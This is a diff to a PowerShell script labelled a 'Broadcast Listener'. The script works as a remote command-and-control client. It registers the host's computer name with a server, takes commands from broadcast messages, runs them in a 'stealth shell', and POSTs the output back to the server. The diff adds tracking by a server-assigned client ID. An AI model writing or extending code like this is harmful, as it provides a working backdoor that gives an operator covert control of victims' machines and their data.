@@ -1,11 +1,14 @@
-# PowerShell Broadcast Listener
-# Usage: .\listener.ps1 [server] [tcpPort] [httpPort]
+# PowerShell Broadcast Listener with Client ID
+# Usage: .\client_v3.ps1 [server] [tcpPort] [httpPort]
 
 param(
     [string]$server = "127.0.0.1",
     [int]$tcpPort = 8081,
     [int]$httpPort = 5005
 )
+
+# Global variable to store client ID
+$script:clientId = $null
 
 # Function to check WiFi/Network availability
 function Test-NetworkConnection {
@@ -83,18 +86,25 @@ while ($true) {
         Write-Host "Press Ctrl+C to stop listening" -ForegroundColor Yellow
         Write-Host ""
 
-        # Send client identification to server
+        # Send client identification to server and get client ID
         $pcName = $env:COMPUTERNAME
         Write-Host "Registering client: $pcName" -ForegroundColor Cyan
         $registrationBody = @{ 
             client_name = $pcName
-            output      = "Client $pcName connected"
             status      = "connected"
         } | ConvertTo-Json
         
         try {
-            Invoke-RestMethod -Uri "http://${server}:${httpPort}/upstream" -Method POST -Body $registrationBody -ContentType "application/json" -ErrorAction Stop | Out-Null
-            Write-Host "Client registered successfully" -ForegroundColor Green
+            $response = Invoke-RestMethod -Uri "http://${server}:${httpPort}/upstream" -Method POST -Body $registrationBody -ContentType "application/json" -ErrorAction Stop
+            
+            if ($response.client_id) {
+                $script:clientId = $response.client_id
+                Write-Host "Client registered successfully!" -ForegroundColor Green
+                Write-Host "Client ID: $script:clientId" -ForegroundColor Cyan
+            }
+            else {
+                Write-Host "Warning: Registered but no client ID received" -ForegroundColor Yellow
+            }
         }
         catch {
             Write-Host "Warning: Could not register client - $($_.Exception.Message)" -ForegroundColor Yellow
@@ -117,13 +127,12 @@ while ($true) {
                     }
                     if ($null -ne $message) {
                         Write-Host "[Broadcast] $message" -ForegroundColor Cyan
-                        # sample print [Broadcast] [2025-11-30T16:29:52.395450] Firebase Change - Path: /command, Data: ls
-                        # extract the cmd after 'Data: '
+                        
+                        # Extract command after 'Data: '
                         if ($message -match 'Data:\s*(.+)$') {
                             $cmd = $matches[1]
                             Write-Host "Executing command: $cmd" -ForegroundColor Green
-                            # if cmd is not empty, execute it (if the cmd makes errors, ignore them)
-                            # output should be send back to server as a text msg to POST /upstream
+                            
                             try {
                                 if ($cmd.Trim() -ne "") {
                                     # Execute command sequence in a temporary stealth shell
@@ -151,12 +160,14 @@ while ($true) {
                                     Write-Host "Command executed successfully" -ForegroundColor Green
                                     Write-Host "Output: $output" -ForegroundColor Gray
                                     
-                                    # Send output back to server as a text message to POST /upstream
+                                    # Send output back to server with client_id
                                     $pcName = $env:COMPUTERNAME
                                     $body = @{ 
                                         client_name = $pcName
+                                        client_id   = $script:clientId
                                         output      = $output 
                                     } | ConvertTo-Json
+                                    
                                     try {
                                         Invoke-RestMethod -Uri "http://${server}:${httpPort}/upstream" -Method POST -Body $body -ContentType "application/json" -ErrorAction Stop | Out-Null
                                         Write-Host "Result sent to server" -ForegroundColor Green
@@ -168,13 +179,16 @@ while ($true) {
                             }
                             catch {
                                 Write-Host "Error executing command: $($_.Exception.Message)" -ForegroundColor Red
-                                # Send error back to server as a text message to POST /upstream
+                                
+                                # Send error back to server with client_id
                                 $pcName = $env:COMPUTERNAME
                                 $errorOutput = "ERROR: $($_.Exception.Message)"
                                 $body = @{ 
                                     client_name = $pcName
+                                    client_id   = $script:clientId
                                     output      = $errorOutput 
                                 } | ConvertTo-Json
+                                
                                 try {
                                     Invoke-RestMethod -Uri "http://${server}:${httpPort}/upstream" -Method POST -Body $body -ContentType "application/json" -ErrorAction Stop | Out-Null
                                     Write-Host "Error sent to server" -ForegroundColor Yellow
@@ -196,6 +210,9 @@ while ($true) {
             if ($reader) { $reader.Close(); $reader = $null }
             if ($stream) { $stream.Close(); $stream = $null }
             if ($client) { $client.Close(); $client = $null }
+            
+            # Reset client ID
+            $script:clientId = $null
             
             # Check if it's a network issue
             if (-not (Test-NetworkConnection)) {
